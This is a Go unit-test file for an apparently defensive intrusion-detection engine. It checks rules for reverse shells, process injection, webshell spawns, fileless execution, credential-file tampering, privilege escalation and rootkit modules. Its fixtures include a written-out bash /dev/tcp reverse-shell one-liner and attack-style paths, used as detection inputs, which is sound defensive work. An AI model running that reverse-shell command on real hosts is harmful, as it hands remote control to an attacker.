package detect

import (
	"context"
	"fmt"
	"net/netip"
	"runtime"
	"sync"
	"testing"
	"time"

	"github.com/gr0gu/cerberus/internal/model"
)

type mockIncidentStore struct {
	mu        sync.Mutex
	incidents map[string]*model.Incident // dedupeKey -> incident
	list      []*model.Incident
	devices   map[string]int64
	openCount int
}

func newMockIncidentStore() *mockIncidentStore {
	return &mockIncidentStore{
		incidents: make(map[string]*model.Incident),
		devices:   make(map[string]int64),
	}
}

func (m *mockIncidentStore) UpsertIncident(ctx context.Context, inc *model.Incident, dedupeWindow time.Duration) (*model.Incident, bool, error) {
	m.mu.Lock()
	defer m.mu.Unlock()

	if devID, exists := m.devices[inc.AgentID]; exists && inc.DeviceID == nil {
		inc.DeviceID = &devID
	}

	if existing, exists := m.incidents[inc.DedupeKey]; exists {
		if inc.LastSeenAt.Sub(existing.LastSeenAt) <= dedupeWindow {
			existing.HitCount++
			existing.LastSeenAt = inc.LastSeenAt
			return existing, false, nil
		}
	}

	inc.ID = int64(len(m.list) + 1)
	m.incidents[inc.DedupeKey] = inc
	m.list = append(m.list, inc)
	if inc.Status == "open" {
		m.openCount++
	}
	return inc, true, nil
}

func (m *mockIncidentStore) GetDeviceIDForAgent(ctx context.Context, agentID string) (*int64, error) {
	m.mu.Lock()
	defer m.mu.Unlock()
	if id, ok := m.devices[agentID]; ok {
		return &id, nil
	}
	return nil, nil
}

func (m *mockIncidentStore) CountOpenIncidents(ctx context.Context) (int, error) {
	m.mu.Lock()
	defer m.mu.Unlock()
	return m.openCount, nil
}

func TestRules_R001_CorrelatedReverseShell(t *testing.T) {
	store := newMockIncidentStore()
	eng := NewEngine(store)

	t0 := time.Date(2026, 10, 12, 12, 0, 0, 0, time.UTC)

	// Step 1: Parent nginx executes
	parentExec := model.NormalizedEvent{
		ID:      1,
		AgentID: "agent-1",
		BootID:  "boot-1",
		Type:    "EXEC",
		TS:      t0,
		PID:     50,
		PPID:    1,
		Comm:    "nginx",
		Image:   "/usr/sbin/nginx",
	}

	// Step 2: Shell executes under nginx
	shellExec := model.NormalizedEvent{
		ID:      2,
		AgentID: "agent-1",
		BootID:  "boot-1",
		Type:    "EXEC",
		TS:      t0.Add(1 * time.Second),
		PID:     100,
		PPID:    50,
		Comm:    "bash",
		Image:   "/bin/bash",
	}

	// Step 3: Outbound connect 3s later to non-loopback IP
	connEvent := model.NormalizedEvent{
		ID:      3,
		AgentID: "agent-1",
		BootID:  "boot-1",
		Type:    "CONNECT",
		TS:      t0.Add(4 * time.Second),
		PID:     100,
		PPID:    50,
		Comm:    "bash",
		Image:   "/bin/bash",
		DstIP:   netip.MustParseAddr("203.0.113.7"),
		DstPort: 4444,
	}

	findings := eng.ProcessSync([]model.NormalizedEvent{parentExec, shellExec, connEvent})
	if len(findings) == 0 {
		t.Fatalf("expected R001 positive detection, got 0 findings")
	}

	f := findings[len(findings)-1]
	if f.RuleID != "CRB-R001" {
		t.Errorf("expected rule CRB-R001, got %s", f.RuleID)
	}
	if f.Severity != "CRITICAL" {
		t.Errorf("expected CRITICAL severity, got %s", f.Severity)
	}
	if f.MitreTechnique != "T1059.004" {
		t.Errorf("expected technique T1059.004, got %s", f.MitreTechnique)
	}
	if f.PIDRoot != 50 {
		t.Errorf("expected pid_root 50 (highest non-shell ancestor), got %d", f.PIDRoot)
	}

	// Negative tests:
	// 1. Loopback connection
	loopbackConn := model.NormalizedEvent{
		ID:      4,
		AgentID: "agent-1",
		BootID:  "boot-1",
		Type:    "CONNECT",
		TS:      t0.Add(5 * time.Second),
		PID:     100,
		PPID:    50,
		Comm:    "bash",
		Image:   "/bin/bash",
		DstIP:   netip.MustParseAddr("127.0.0.1"),
		DstPort: 4444,
	}
	neg1 := eng.ProcessSync([]model.NormalizedEvent{loopbackConn})
	if len(neg1) != 0 {
		t.Errorf("expected 0 findings for loopback destination, got %d", len(neg1))
	}

	// 2. Non-shell tool (curl)
	curlConn := model.NormalizedEvent{
		ID:      5,
		AgentID: "agent-1",
		BootID:  "boot-1",
		Type:    "CONNECT",
		TS:      t0.Add(6 * time.Second),
		PID:     200,
		PPID:    1,
		Comm:    "curl",
		Image:   "/usr/bin/curl",
		DstIP:   netip.MustParseAddr("203.0.113.7"),
		DstPort: 4444,
	}
	neg2 := eng.ProcessSync([]model.NormalizedEvent{curlConn})
	if len(neg2) != 0 {
		t.Errorf("expected 0 findings for curl connection, got %d", len(neg2))
	}

	// 3. Shell connect 45s after exec with non-daemon parent
	nonDaemonExec := model.NormalizedEvent{
		ID:      6,
		AgentID: "agent-1",
		BootID:  "boot-1",
		Type:    "EXEC",
		TS:      t0,
		PID:     300,
		PPID:    1,
		Comm:    "systemd",
		Image:   "/lib/systemd/systemd",
	}
	bashLateExec := model.NormalizedEvent{
		ID:      7,
		AgentID: "agent-1",
		BootID:  "boot-1",
		Type:    "EXEC",
		TS:      t0,
		PID:     301,
		PPID:    300,
		Comm:    "bash",
		Image:   "/bin/bash",
	}
	bashLateConn := model.NormalizedEvent{
		ID:      8,
		AgentID: "agent-1",
		BootID:  "boot-1",
		Type:    "CONNECT",
		TS:      t0.Add(45 * time.Second),
		PID:     301,
		PPID:    300,
		Comm:    "bash",
		Image:   "/bin/bash",
		DstIP:   netip.MustParseAddr("203.0.113.7"),
		DstPort: 4444,
	}
	neg3 := eng.ProcessSync([]model.NormalizedEvent{nonDaemonExec, bashLateExec, bashLateConn})
	if len(neg3) != 0 {
		t.Errorf("expected 0 findings for late bash connect without daemon parent, got %d", len(neg3))
	}
}

func TestRules_R002_InteractiveReadline(t *testing.T) {
	store := newMockIncidentStore()
	eng := NewEngine(store)

	ev := model.NormalizedEvent{
		ID:      1,
		AgentID: "agent-1",
		BootID:  "boot-1",
		Type:    "BASH_READLINE",
		TS:      time.Now().UTC(),
		PID:     1234,
		Command: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
	}

	findings := eng.ProcessSync([]model.NormalizedEvent{ev})
	if len(findings) != 1 {
		t.Fatalf("expected 1 finding for R002, got %d", len(findings))
	}
	if findings[0].RuleID != "CRB-R002" || findings[0].Severity != "CRITICAL" {
		t.Errorf("expected CRB-R002 CRITICAL, got %v", findings[0])
	}
}

func TestRules_R003_MemoryInjection(t *testing.T) {
	store := newMockIncidentStore()
	eng := NewEngine(store)

	// Critical: arbitrary non-debugger
	ev1 := model.NormalizedEvent{
		ID:        1,
		AgentID:   "agent-1",
		BootID:    "boot-1",
		Type:      "PROC_INJECTION",
		Action:    "process_vm_writev",
		PID:       500,
		TargetPID: 812,
		Comm:      "evil_inject",
		TS:        time.Now().UTC(),
	}
	res1 := eng.ProcessSync([]model.NormalizedEvent{ev1})
	if len(res1) != 1 || res1[0].Severity != "CRITICAL" {
		t.Errorf("expected 1 CRITICAL finding, got %v", res1)
	}

	// High: debugger allowlist
	ev2 := model.NormalizedEvent{
		ID:        2,
		AgentID:   "agent-1",
		BootID:    "boot-1",
		Type:      "PROC_INJECTION",
		Action:    "process_vm_writev",
		PID:       501,
		TargetPID: 812,
		Comm:      "gdb",
		TS:        time.Now().UTC(),
	}
	res2 := eng.ProcessSync([]model.NormalizedEvent{ev2})
	if len(res2) != 1 || res2[0].Severity != "HIGH" {
		t.Errorf("expected 1 HIGH finding for gdb, got %v", res2)
	}

	// Self-target: 0
	ev3 := model.NormalizedEvent{
		ID:        3,
		AgentID:   "agent-1",
		BootID:    "boot-1",
		Type:      "PROC_INJECTION",
		Action:    "process_vm_writev",
		PID:       812,
		TargetPID: 812,
		Comm:      "self",
		TS:        time.Now().UTC(),
	}
	res3 := eng.ProcessSync([]model.NormalizedEvent{ev3})
	if len(res3) != 0 {
		t.Errorf("expected 0 findings for self target, got %v", res3)
	}
}

func TestRules_R004_PtraceInjection(t *testing.T) {
	store := newMockIncidentStore()
	eng := NewEngine(store)

	evNonDbg := model.NormalizedEvent{
		ID:        1,
		AgentID:   "agent-1",
		BootID:    "boot-1",
		Type:      "PROC_INJECTION",
		Action:    "ptrace",
		PID:       100,
		TargetPID: 200,
		Comm:      "injector",
		TS:        time.Now().UTC(),
	}
	res := eng.ProcessSync([]model.NormalizedEvent{evNonDbg})
	if len(res) != 1 || res[0].Severity != "HIGH" {
		t.Errorf("expected 1 HIGH finding for ptrace, got %v", res)
	}

	evDbg := model.NormalizedEvent{
		ID:        2,
		AgentID:   "agent-1",
		BootID:    "boot-1",
		Type:      "PROC_INJECTION",
		Action:    "ptrace",
		PID:       101,
		TargetPID: 200,
		Comm:      "lldb",
		TS:        time.Now().UTC(),
	}
	res2 := eng.ProcessSync([]model.NormalizedEvent{evDbg})
	if len(res2) != 0 {
		t.Errorf("expected 0 findings for lldb ptrace, got %v", res2)
	}
}

func TestRules_R005_WebshellSpawn(t *testing.T) {
	store := newMockIncidentStore()
	eng := NewEngine(store)

	t0 := time.Now().UTC()
	parent := model.NormalizedEvent{
		ID:      1,
		AgentID: "agent-1",
		BootID:  "boot-1",
		Type:    "EXEC",
		PID:     80,
		PPID:    1,
		Comm:    "apache2",
		Image:   "/usr/sbin/apache2",
		TS:      t0,
	}
	shell := model.NormalizedEvent{
		ID:      2,
		AgentID: "agent-1",
		BootID:  "boot-1",
		Type:    "EXEC",
		PID:     85,
		PPID:    80,
		Comm:    "sh",
		Image:   "/bin/sh",
		TS:      t0.Add(500 * time.Millisecond),
	}

	findings := eng.ProcessSync([]model.NormalizedEvent{parent, shell})
	if len(findings) != 1 || findings[0].RuleID != "CRB-R005" {
		t.Fatalf("expected CRB-R005 finding, got %v", findings)
	}
}

func TestRules_R006_FilelessMemfd(t *testing.T) {
	store := newMockIncidentStore()
	eng := NewEngine(store)

	t0 := time.Now().UTC()
	memfd := model.NormalizedEvent{
		ID:      1,
		AgentID: "agent-1",
		BootID:  "boot-1",
		Type:    "MEMFD_CREATE",
		PID:     9,
		Comm:    "loader",
		TS:      t0,
	}
	exec := model.NormalizedEvent{
		ID:      2,
		AgentID: "agent-1",
		BootID:  "boot-1",
		Type:    "EXEC",
		PID:     9,
		Comm:    "payload",
		Image:   "/proc/self/fd/3",
		TS:      t0.Add(2 * time.Second),
	}

	findings := eng.ProcessSync([]model.NormalizedEvent{memfd, exec})
	if len(findings) != 1 || findings[0].RuleID != "CRB-R006" || findings[0].Severity != "CRITICAL" {
		t.Fatalf("expected CRB-R006 CRITICAL, got %v", findings)
	}
}

func TestRules_R007_FileTamper(t *testing.T) {
	store := newMockIncidentStore()
	eng := NewEngine(store)

	crit := model.NormalizedEvent{
		ID:      1,
		AgentID: "agent-1",
		BootID:  "boot-1",
		Type:    "FILE_TAMPER",
		Path:    "/etc/shadow",
		TS:      time.Now().UTC(),
	}
	f1 := eng.ProcessSync([]model.NormalizedEvent{crit})
	if len(f1) != 1 || f1[0].Severity != "CRITICAL" {
		t.Errorf("expected CRITICAL for /etc/shadow, got %v", f1)
	}

	high := model.NormalizedEvent{
		ID:      2,
		AgentID: "agent-1",
		BootID:  "boot-1",
		Type:    "FILE_TAMPER",
		Path:    "/etc/sudoers.d/99-evil",
		TS:      time.Now().UTC(),
	}
	f2 := eng.ProcessSync([]model.NormalizedEvent{high})
	if len(f2) != 1 || f2[0].Severity != "HIGH" {
		t.Errorf("expected HIGH for sudoers, got %v", f2)
	}
}

func TestRules_R008_PrivEsc(t *testing.T) {
	store := newMockIncidentStore()
	eng := NewEngine(store)

	unauth := model.NormalizedEvent{
		ID:        1,
		AgentID:   "agent-1",
		BootID:    "boot-1",
		Type:      "PRIV_ESC",
		OldUID:    1000,
		TargetUID: 0,
		Comm:      "evil_exploit",
		TS:        time.Now().UTC(),
	}
	f1 := eng.ProcessSync([]model.NormalizedEvent{unauth})
	if len(f1) != 1 || f1[0].Severity != "HIGH" {
		t.Errorf("expected HIGH for unauthorized priv esc, got %v", f1)
	}

	authSudo := model.NormalizedEvent{
		ID:        2,
		AgentID:   "agent-1",
		BootID:    "boot-1",
		Type:      "PRIV_ESC",
		OldUID:    1000,
		TargetUID: 0,
		Comm:      "sudo",
		TS:        time.Now().UTC(),
	}
	f2 := eng.ProcessSync([]model.NormalizedEvent{authSudo})
	if len(f2) != 0 {
		t.Errorf("expected 0 for sudo priv esc, got %v", f2)
	}
}

func TestRules_R009_KernelModule(t *testing.T) {
	store := newMockIncidentStore()
	eng := NewEngine(store)

	crit := model.NormalizedEvent{
		ID:      1,
		AgentID: "agent-1",
		BootID:  "boot-1",
		Type:    "KERNEL_MODULE",
		Path:    "/tmp/rootkit.ko",
		TS:      time.Now().UTC(),
	}
	f1 := eng.ProcessSync([]model.NormalizedEvent{crit})
	if len(f1) != 1 || f1[0].Severity != "CRITICAL" {
		t.Errorf("expected CRITICAL for /tmp module, got %v", f1)
	}

	norm := model.NormalizedEvent{
		ID:      2,
		AgentID: "agent-1",
		BootID:  "boot-1",
		Type:    "KERNEL_MODULE",
		Path:    "/lib/modules/test.ko",
		TS:      time.Now().UTC(),
	}
	f2 := eng.ProcessSync([]model.NormalizedEvent{norm})
	if len(f2) != 1 || f2[0].Severity != "HIGH" {
		t.Errorf("expected HIGH for standard module, got %v", f2)
	}
}

func TestRules_R010_OutboundFanout(t *testing.T) {
	store := newMockIncidentStore()
	eng := NewEngine(store)

	t0 := time.Now().UTC()
	var evs []model.NormalizedEvent
	for i := 1; i <= 55; i++ {
		evs = append(evs, model.NormalizedEvent{
			ID:      int64(i),
			AgentID: "agent-1",
			BootID:  "boot-1",
			Type:    "CONNECT",
			PID:     444,
			Comm:    "scanner",
			DstIP:   netip.MustParseAddr(fmt.Sprintf("198.51.100.%d", i)),
			DstPort: 80,
			TS:      t0.Add(time.Duration(i*100) * time.Millisecond),
		})
	}

	findings := eng.ProcessSync(evs)
	foundR010 := false
	for _, f := range findings {
		if f.RuleID == "CRB-R010" {
			foundR010 = true
			if f.Severity != "MEDIUM" {
				t.Errorf("expected MEDIUM severity for R010, got %s", f.Severity)
			}
		}
	}
	if !foundR010 {
		t.Errorf("expected R010 finding for 55 distinct outbound destinations within 10s")
	}
}

func TestDeduplication_AndHitCount(t *testing.T) {
	store := newMockIncidentStore()
	eng := NewEngine(store)

	t0 := time.Date(2026, 10, 12, 10, 0, 0, 0, time.UTC)

	// 20 R002 hits within 2 minutes from same PID
	var batch []model.NormalizedEvent
	for i := 0; i < 20; i++ {
		batch = append(batch, model.NormalizedEvent{
			ID:      int64(i + 1),
			AgentID: "agent-1",
			BootID:  "boot-1",
			Type:    "BASH_READLINE",
			PID:     999,
			Command: "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1",
			TS:      t0.Add(time.Duration(i*5) * time.Second),
		})
	}

	eng.ProcessSync(batch)

	store.mu.Lock()
	if len(store.list) != 1 {
		t.Fatalf("expected exactly 1 deduplicated incident for 20 hits, got %d", len(store.list))
	}
	if store.list[0].HitCount != 20 {
		t.Errorf("expected HitCount 20, got %d", store.list[0].HitCount)
	}
	store.mu.Unlock()

	// Another hit after the 5-minute dedupe window has expired -> produces second incident
	hitAtExpiredWindow := model.NormalizedEvent{
		ID:      21,
		AgentID: "agent-1",
		BootID:  "boot-1",
		Type:    "BASH_READLINE",
		PID:     999,
		Command: "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1",
		TS:      t0.Add(8 * time.Minute),
	}
	eng.ProcessSync([]model.NormalizedEvent{hitAtExpiredWindow})

	store.mu.Lock()
	if len(store.list) != 2 {
		t.Errorf("expected second incident after window expired, got %d incidents", len(store.list))
	}
	store.mu.Unlock()
}

func TestBootReset_ClearsProcTable(t *testing.T) {
	store := newMockIncidentStore()
	eng := NewEngine(store)

	t0 := time.Now().UTC()
	// Exec in boot-1
	execBoot1 := model.NormalizedEvent{
		ID:      1,
		AgentID: "agent-1",
		BootID:  "boot-1",
		Type:    "EXEC",
		PID:     100,
		PPID:    1,
		Comm:    "bash",
		Image:   "/bin/bash",
		TS:      t0,
	}

	// Connect in boot-2 (reboot happened)
	connBoot2 := model.NormalizedEvent{
		ID:      2,
		AgentID: "agent-1",
		BootID:  "boot-2",
		Type:    "CONNECT",
		PID:     100,
		PPID:    1,
		Comm:    "bash",
		Image:   "",
		DstIP:   netip.MustParseAddr("203.0.113.7"),
		DstPort: 4444,
		TS:      t0.Add(5 * time.Second),
	}

	findings := eng.ProcessSync([]model.NormalizedEvent{execBoot1, connBoot2})
	// Connect should not correlate with execBoot1 because boot reset cleared state
	for _, f := range findings {
		if f.RuleID == "CRB-R001" {
			t.Errorf("unexpected R001 finding across different boot IDs")
		}
	}
}

func TestEngine_RaceAndGoroutineLeak(t *testing.T) {
	store := newMockIncidentStore()
	eng := NewEngine(store, WithNumShards(8))

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	initialGoroutines := runtime.NumGoroutine()
	eng.Start(ctx)

	const eventCount = 100000
	var wg sync.WaitGroup

	for worker := 0; worker < 4; worker++ {
		wg.Add(1)
		go func(w int) {
			defer wg.Done()
			for i := 0; i < eventCount/4; i++ {
				ev := model.NormalizedEvent{
					ID:      int64(w*1000000 + i),
					AgentID: fmt.Sprintf("agent-%d", i%10),
					BootID:  "boot-race",
					Type:    "EXEC",
					PID:     uint32(1000 + (i % 500)),
					PPID:    1,
					Comm:    "sh",
					Image:   "/bin/sh",
					TS:      time.Now().UTC(),
				}
				eng.Submit(int64(i), []model.NormalizedEvent{ev})
			}
		}(worker)
	}

	wg.Wait()

	stopCtx, stopCancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer stopCancel()

	if err := eng.Stop(stopCtx); err != nil {
		t.Fatalf("failed to stop engine: %v", err)
	}

	// Allow goroutines to fully exit
	time.Sleep(50 * time.Millisecond)
	finalGoroutines := runtime.NumGoroutine()
	if finalGoroutines > initialGoroutines+2 {
		t.Errorf("potential goroutine leak: started with %d, ended with %d", initialGoroutines, finalGoroutines)
	}
}
